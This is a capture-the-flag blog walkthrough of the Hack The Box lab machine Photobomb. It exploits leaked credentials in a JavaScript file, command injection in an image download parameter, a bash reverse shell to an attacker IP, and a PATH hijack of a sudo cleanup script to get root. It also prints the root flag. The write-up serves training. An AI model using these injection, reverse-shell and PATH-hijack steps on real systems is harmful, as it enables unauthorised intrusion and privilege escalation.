---
layout: post
title: "HTB: PHOTOBOMB (10.10.11.182)"
description: "Photobomb was an easy box from Hack The Box that starts out with having to find credentials within a JavaScript file, utilizing them to access an image manipulation panel, and then exploiting a command injection vulnerability in the panel to gain shell access. For privilege escalation, I will run a script as root, utilizing a find command that was not called with its full path."
tags: [hackthebox, htb, photobomb, js, command injection, RCE, path-injection, burp,]
image: "/assets/img/photobomb/photobomb_feature.png"
---
## RECON
### Nmap

As always we start off with the recon and enumeration process to get an overview of our attack surface and target's running service.

`nmap` finds two open TCP ports, SSH (22) and HTTP (80):.

```sh
# Nmap 7.92 scan initiated Fri Feb 10 12:27:30 2023 as: nmap -p- --min-rate 10000 -oA nmap/allports 10.10.11.182
Nmap scan report for 10.10.11.182
Host is up (0.59s latency).
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http

# Nmap done at Fri Feb 10 12:27:43 2023 -- 1 IP address (1 host up) scanned in 12.61 seconds

# Nmap 7.92 scan initiated Fri Feb 10 12:28:24 2023 as: nmap -sC -sV -p 22,80 -oA nmap/photobomb 10.10.11.182
Nmap scan report for 10.10.11.182
Host is up (0.28s latency).

PORT   STATE SERVICE VERSION
  22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   3072 e2:24:73:bb:fb:df:5c:b5:20:b6:68:76:74:8a:b5:8d (RSA)
|   256 04:e3:ac:6e:18:4e:1b:7e:ff:ac:4f:e3:9d:d2:1b:ae (ECDSA)
|_  256 20:e0:5d:8c:ba:71:f0:8c:3a:18:19:f2:40:11:d2:9e (ED25519)
80/tcp open  http    nginx 1.18.0 (Ubuntu)
|_http-title: Did not follow redirect to http://photobomb.htb/
|_http-server-header: nginx/1.18.0 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Fri Feb 10 12:28:51 2023 -- 1 IP address (1 host up) scanned in 26.37 seconds
```
Based on the [OpenSSH version](https://packages.ubuntu.com/search?keywords=openssh-server){:target="_blank"}, the host is likely running Ubuntu focal (20.04LTS). Port 80 shows a redirect to photobomb.htb.

### Website - TCP 80
#### Site
The site talks about quality image printing. It gives a clue about where to find our credentials.

![Default page](/assets/img/photobomb/defaultpage.png)

Checking on developers tools to see which files are loaded. I see an interesting file `photobomb.js`

![photobomb.js](/assets/img/photobomb/photobombjs.png)

Which gives us a `js` file with a url and credentials on it. `username`:`pH0t0` & `password`:`b0Mb!`

```js
function init() {
  // Jameson: pre-populate creds for tech support as they keep forgetting them and emailing me
  if (document.cookie.match(/^(.*;)?\s*isPhotoBombTechSupport\s*=\s*[^;]+(.*)?$/)) {
    document.getElementsByClassName('creds')[0].setAttribute('href','http://pH0t0:b0Mb!@photobomb.htb/printer');
  }
}
window.onload = init;
```
#### Tech Stack
The HTTP response headers don’t show much besides `NGINX`:

```http
HTTP/1.1 200 OK
Server: nginx/1.18.0 (Ubuntu)
Date: Sat, 11 Feb 2023 13:09:35 GMT
Content-Type: text/html;charset=utf-8
Connection: close
X-Xss-Protection: 1; mode=block
X-Content-Type-Options: nosniff
X-Frame-Options: SAMEORIGIN
Content-Length: 843
```
### Login page

Clicking on the `url` provided automatically logs us to the site.
`http://pH0t0:b0Mb!@photobomb.htb/printer`

![printer page](/assets/img/photobomb/printerpage.png)  

## Shell as Wizard
### Testing for RCE

The site allows for download of pictures using different filetypes and Sizes.

I will Intercept the download with `burp` and see what the request looks like and try some `command injection` in all parameters since am not sure which one is injectable. I will initiate a `ping` from the server to my box


![RCE Testing](/assets/img/photobomb/burptestingrce.png)

And I get a hit. The `filetype` is vulnerable to `command injection`

![RCE Testing](/assets/img/photobomb/testing_rce.png)

### Exploiting filetype To Gain RCE

I will use the `bash` script from [PentestMonkey](https://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet){:target="_blank"}.

```sh
bash -c 'bash -i >& /dev/tcp/10.10.16.15/9001 0>&1'
```

![Rev Shell](/assets/img/photobomb/revshellbash.png)

One thing to note, without the `bash -c` the rev shell fails

And we get a shell on the box.

```sh
┌─[george@parrot]─[~/HTB/boxes/photobomb]
└──╼ $nc -lvnp 9001
listening on [any] 9001 ...
connect to [10.10.16.15] from (UNKNOWN) [10.10.11.182] 43228
bash: cannot set terminal process group (697): Inappropriate ioctl for device
bash: no job control in this shell
wizard@photobomb:~/photobomb$
```
I will upgrade my shell using `python3` and `stty`

```sh
wizard@photobomb:~/photobomb$ python3 -c 'import pty;pty.spawn("/bin/bash")'
python3 -c 'import pty;pty.spawn("/bin/bash")'
wizard@photobomb:~/photobomb$ ^Z
[1]+  Stopped                 nc -lvnp 9001
┌─[✗]─[george@parrot]─[~/HTB/boxes/photobomb]
└──╼ $stty raw -echo;fg
nc -lvnp 9001

wizard@photobomb:~/photobomb$
```
## Shell as root
### Enumeration
#### Sudo Permissions

Before running out beloved `linpeas` lets see what our `sudo permissions` are

```sh
wizard@photobomb:~/photobomb$ sudo -l
Matching Defaults entries for wizard on photobomb:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User wizard may run the following commands on photobomb:
    (root) SETENV: NOPASSWD: /opt/cleanup.sh
```
And lady luck smiled down on us :). We have a `cleanup.sh` script which we can run with `sudo` privilages and no `password`.

```sh
wizard@photobomb:~/photobomb$ ls -l /opt/cleanup.sh
-r-xr-xr-x 1 root root 340 Sep 15 12:11 /opt/cleanup.sh

wizard@photobomb:~/photobomb$ cat /opt/cleanup.sh
#!/bin/bash
. /opt/.bashrc
cd /home/wizard/photobomb

# clean up log files
if [ -s log/photobomb.log ] && ! [ -L log/photobomb.log ]
then
  /bin/cat log/photobomb.log > log/photobomb.log.old
  /usr/bin/truncate -s0 log/photobomb.log
fi

# protect the priceless originals
find source_images -type f -name '*.jpg' -exec chown root:root {} \;
```
### Exploiting Path Hijack

The content of the script is pretty straight forward. Its taking the log file and move their content into `photobomb.log.old` and then use truncate to clear `photobomb.log` to 0 byte

Also the script is not using `absolute path` when calling `find` unlike the others. We can take advantage of that and `traverse` the path of that binary

I’ll run cleanup.sh as root but with the PATH variable including the current directory at the front of the path:

```sh
wizard@photobomb:~$ echo "/bin/bash" > /tmp/cd
echo "/bin/bash" > /tmp/cd
wizard@photobomb:~$ echo "/bin/bash" > /tmp/find
echo "/bin/bash" > /tmp/find
wizard@photobomb:~$ sudo PATH=/tmp:$PATH /opt/cleanup.sh
sudo PATH=/tmp:$PATH /opt/cleanup.sh
root@photobomb:/home/wizard/photobomb# id
id
uid=0(root) gid=0(root) groups=0(root)
```
And we can get the flag

```sh
root@photobomb:~# cat root.txt
6e1520841af265a0b4670439d183a254
```
********* And that was fun!!. Thank you for taking time to read my blog ************
